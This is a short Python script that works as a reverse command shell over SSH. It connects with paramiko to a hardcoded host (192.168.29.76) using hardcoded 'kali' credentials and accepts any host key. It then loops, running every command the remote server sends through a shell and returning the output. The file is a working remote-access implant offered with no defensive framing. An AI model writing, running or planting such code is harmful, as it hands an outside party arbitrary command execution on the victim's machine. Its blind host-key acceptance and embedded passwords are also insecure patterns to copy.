#!/bin/python3
import threading
import paramiko
import subprocess
import sys

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()

    # Load Host Keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(ip, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)

        print(ssh_session.recv(1024).decode(errors="ignore"))

        while True:
            command = ssh_session.recv(1024) # Get Command from SSH Server

            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(str(cmd_output))
            except:
                print("[+] Connection Closed")
                sys.exit(1)

        client.close()
    return

ssh_command('192.168.29.76', 'kali', 'kali', 'ClientConnected')
